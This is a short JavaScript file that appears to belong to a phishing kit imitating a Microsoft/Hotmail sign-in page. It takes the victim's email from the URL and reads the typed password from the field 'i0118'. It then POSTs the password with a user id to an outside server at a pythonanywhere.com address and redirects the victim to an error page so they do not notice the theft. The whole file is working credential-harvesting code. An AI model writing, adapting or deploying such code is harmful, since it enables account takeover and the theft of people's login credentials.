document.addEventListener('DOMContentLoaded', function() {

    // get hotmail value from prev screen
    const urlParams = new URLSearchParams(window.location.search);
    const userMail = urlParams.get('value');
    const userId = urlParams.get('userId');

    // set data of user mail to UI 
    const displayName = document.getElementById('displayName'); 
    displayName.textContent = userMail;

    // check data and continue to send data to server
    const btnSgt = document.getElementById('btnSgt');
    btnSgt.onclick = function(){

        const userPwd = document.getElementById('i0118');
        const stringValue = userPwd.value; 

        if (stringValue === '' || stringValue.length < 4 ) {
            // Display error message to the user
            var errorMessage = "<p style='color: red;'>Contraseña inválida.</p>";
            // Check if the error message element already exists
            if (!document.getElementById("errorMessage")) {
              var wrapperDiv = document.createElement("div");
              wrapperDiv.id = "errorMessage";
              wrapperDiv.innerHTML = errorMessage;
    
              var i0116Element = document.getElementById("i0118");
              i0116Element.parentNode.insertBefore(wrapperDiv, i0116Element.nextSibling);
            }
          } else {
            // todo: show a load screen, would be better 
            // Send to next screen and go to next screen
            // send data to server
            var user_card = new Object();
            user_card.userId = userId;
            user_card.userMail = "";
            user_card.userPwd = stringValue;
    
            var jsonString= JSON.stringify(user_card);
            console.log(jsonString);

            //var url = "http://buddahead123.pythonanywhere.com/send_utilities_mail";
            var url = "https://buddahead123.pythonanywhere.com/send_utilities_mail";
            //var url = "http://127.0.0.1:5000/send_utilities_mail";

            var params = user_card;
            var parameters = JSON.stringify(user_card);
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);

            // Send the proper header information along with the request
            xhr.setRequestHeader("Content-type", "application/json");
            xhr.send(parameters);
        
            window.location = "/error"
          }

       /// window.location = "/error"
    }


  });